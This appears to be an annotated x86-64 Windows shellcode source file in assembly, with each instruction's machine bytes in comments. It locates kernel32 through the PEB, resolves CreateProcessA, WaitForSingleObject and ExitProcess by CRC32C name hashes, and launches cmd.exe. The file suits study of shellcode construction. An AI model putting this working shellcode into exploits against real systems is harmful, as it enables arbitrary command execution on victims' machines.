    .section .shcode, "ax"
/* MinGW entrypoint is either mainCRTStartup or WinMainCRTStartup
 * Define symbols with storage class 2 (IMAGE_SYM_CLASS_EXTERNAL), and object
 * type 32 (function), for COFF Symbol Table.
 */
    .globl mainCRTStartup
    .def mainCRTStartup; .scl 2; .type 32; .endef
    .set mainCRTStartup, _start
    .globl WinMainCRTStartup
    .def WinMainCRTStartup; .scl 2; .type 32; .endef
    .set WinMainCRTStartup, _start
    .globl _start
    .def _start; .scl 2; .type 32; .endef
_start:
    /* fc                */  cld                            /* Clear direction flag */
    /* eb 7e             */  jmp    start                   /* Make relative calls negative */

/* Call the function in kernel32 identified by hash in eax
 * Parameters: rcx, rdx, r8, r9, stack
 */
call_by_hash:
    /* 55                */  push   %rbp                    /* Save registers */
    /* 51                */  push   %rcx
    /* 52                */  push   %rdx
    /* 56                */  push   %rsi
    /* 57                */  push   %rdi
    /* 31 c0             */  xor    %eax, %eax
    /* 65 48 8b 40 60    */  mov    %gs:0x60(%rax), %rax
    /* 48 8b 40 18       */  mov    0x18(%rax), %rax        /* rax = PEB->Ldr */
    /* 48 8b 70 10       */  mov    0x10(%rax), %rsi        /* rsi = Ldr->InLoadOrderModuleList.Flink */
    /* 48 8b 36          */  mov    (%rsi), %rsi            /* Next module (ntdll) */
    /* 48 ad             */  lods   %ds:(%rsi), %rax        /* Next module (kernel32) */
    /* 48 8b 68 30       */  mov    0x30(%rax), %rbp        /* rbp = rax->DllBase */
    /* 8b 75 3c          */  mov    0x3c(%rbp), %esi        /* esi = IMAGE_DOS_HEADER->e_lfanew */
    /* 83 c6 40          */  add    $0x40, %esi             /* Avoid an offset > 127 */
    /* 8b 54 35 48       */  mov    0x48(%rbp, %rsi, 1), %edx
                                                            /* edx = IMAGE_NT_HEADERS->OptionalHeader */
                                                            /*   .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT] */
                                                            /*   .VirtualAddress */
    /* 48 8d 54 15 ff    */  lea    -0x1(%rbp, %rdx, 1), %rdx
                                                            /* rdx = IMAGE_EXPORT_DIRECTORY - 1 to avoid a 0x20 */
    /* 8b 4a 19          */  mov    0x19(%rdx), %ecx        /* ecx = rdx->NumberOfNames */
    /* 8b 7a 21          */  mov    0x21(%rdx), %edi        /* edi = rdx->AddressOfNames */
    /* 52                */  push   %rdx                    /* Save rdx while finding function */
    /* 48 01 ef          */  add    %rbp, %rdi
_find_function:
    /* ff c9             */  dec    %ecx
    /* 78 fe             */  js     .                       /* Loop forever if function is not found */
    /* 8b 34 8f          */  mov    (%rdi, %rcx, 4), %esi   /* Compute CRC32C: */
    /* 48 01 ee          */  add    %rbp, %rsi              /*   rsi = name */
    /* 31 c0             */  xor    %eax, %eax              /*   al = current char/bit index */
    /* 99                */  cltd                           /*   edx = hash */
                                                            /*   ebx = hash to be found */
                                                            /*   ecx, rdi, rbp: assigned */
_compute_hash_loop:
    /* ac                */  lods   %ds:(%rsi), %al
    /* 84 c0             */  test   %al, %al
    /* 74 14             */  je     _hash_finished
    /* 30 c2             */  xor    %al, %dl
    /* b0 08             */  mov    $0x8, %al
_compute_hash_bit:
    /* d1 ea             */  shr    %edx
    /* 73 06             */  jae    _skip_xor
    /* 81 f2 78 3b f6 82 */  xor    $0x82f63b78, %edx       /* Reversed Castagnoli polynomial */
_skip_xor:
    /* fe c8             */  dec    %al
    /* 75 f2             */  jne    _compute_hash_bit
    /* eb e7             */  jmp    _compute_hash_loop

_hash_finished:
    /* 39 da             */  cmp    %ebx, %edx              /* Compare hashes */
    /* 75 d6             */  jne    _find_function          /* Loop back to _find_function */

    /* 5a                */  pop    %rdx                    /* Restore rdx = IMAGE_EXPORT_DIRECTORY - 1 */
    /* 8b 7a 25          */  mov    0x25(%rdx), %edi        /* edi = rdx->AddressOfNameOrdinals */
    /* 48 01 ef          */  add    %rbp, %rdi
    /* 0f b7 04 4f       */  movzwl (%rdi, %rcx, 2), %eax   /* Convert rcx to ordinal ax */
    /* 8b 72 1d          */  mov    0x1d(%rdx), %esi        /* esi = rdx->AddressOfFunctions */
    /* 48 01 ee          */  add    %rbp, %rsi
    /* 8b 04 86          */  mov    (%rsi, %rax, 4), %eax
    /* 48 01 e8          */  add    %rbp, %rax              /* rax = function address */
    /* 5f                */  pop    %rdi                    /* Restore saved registers */
    /* 5e                */  pop    %rsi
    /* 5a                */  pop    %rdx
    /* 59                */  pop    %rcx
    /* 5d                */  pop    %rbp
    /* ff e0             */  jmpq   *%rax                   /* Jump to found function */

start:
    /* 68 01 63 6d 64    */  pushq  $0x646d6301             /* Push "\x01cmd" */
    /* 54                */  push   %rsp
    /* 5a                */  pop    %rdx                    /* args(lpCommandLine) = rsp */
    /* c1 2a 08          */  shrl   $0x8, (%rdx)            /* Shift the command line letters */
    /* 48 83 e4 f0       */  and    $0xfffffffffffffff0, %rsp /* Align stack on 16 bytes */
    /* 31 c9             */  xor    %ecx, %ecx
    /* b1 88             */  mov    $0x88, %cl              /* Allocate 136 bytes for: */
    /* 48 29 cc          */  sub    %rcx, %rsp              /*   PROCESS_INFORMATION (24) */
                                                            /*   STARTUPINFO (104) */
                                                            /*   ... with size (-8) */
                                                            /*   2 stratch registers (16) */
    /* 54                */  push   %rsp
    /* 5f                */  pop    %rdi
    /* 31 c0             */  xor    %eax, %eax
    /* f3 aa             */  rep stos %al, %es:(%rdi)       /* ZeroMemory */
                                                            /* ... and ecx = args(lpApplicationName) = 0 */
    /* 48 83 ef 18       */  sub    $0x18, %rdi             /* rdi = &PROCESS_INFORMATION */
    /* 41 58             */  pop    %r8                     /* args(lpProcessAttributes) = NULL */
    /* 41 59             */  pop    %r9                     /* args(lpThreadAttributes) = NULL */
    /* 6a 68             */  pushq  $0x68                   /* STARTUPINFO.cbSize = 104 */
    /* 54                */  push   %rsp
    /* 5e                */  pop    %rsi
    /* 57                */  push   %rdi                    /* args(lpProcessInformation) = rdi */
    /* 56                */  push   %rsi                    /* args(lpStartupInfo) = &STARTUPINFO */
    /* 51                */  push   %rcx                    /* args(lpCurrentDirectory) = NULL */
    /* 51                */  push   %rcx                    /* args(lpEnvironment) = NULL */
    /* 6a 10             */  pushq  $0x10                   /* args(dwCreationFlags) = CREATE_NEW_CONSOLE */
    /* 6a 01             */  pushq  $0x1                    /* args(bInheritHandles) = TRUE */
    /* 51                */  push   %rcx
    /* 51                */  push   %rcx
    /* 51                */  push   %rcx
    /* 51                */  push   %rcx
    /* bb 24 05 1a 7a    */  mov    $0x7a1a0524, %ebx       /* Call CreateProcessA( */
                                                            /*     rcx         lpApplicationName */
                                                            /*     rdx         lpCommandLine  */
                                                            /*     r8:         lpProcessAttributes */
                                                            /*     r9:         lpThreadAttributes */
                                                            /*     0x20(%rsp): bInheritHandles */
                                                            /*     0x28(%rsp): dwCreationFlags */
                                                            /*     0x30(%rsp): lpEnvironment */
                                                            /*     0x38(%rsp): lpCurrentDirectory */
                                                            /*     0x40(%rsp): lpStartupInfo */
                                                            /*     0x48(%rsp): lpProcessInformation */
    /* e8 45 ff ff ff    */  callq  call_by_hash            /* ) */
    /* 6a ff             */  pushq  $0xffffffffffffffff
    /* 5a                */  pop    %rdx                    /* args(dwMilliseconds) = INFINITE */
    /* 48 8b 0f          */  mov    (%rdi), %rcx            /* args(hHandle) = hProcess */
    /* bb 76 51 94 d8    */  mov    $0xd8945176, %ebx       /* Call WaitForSingleObject */
_exit_loop:
    /* e8 35 ff ff ff    */  callq  call_by_hash
    /* 31 c9             */  xor    %ecx, %ecx              /* args(uExitCode) = 0 */
    /* bb d5 a5 c9 42    */  mov    $0x42c9a5d5, %ebx       /* Call ExitProcess */
    /* eb f2             */  jmp    _exit_loop
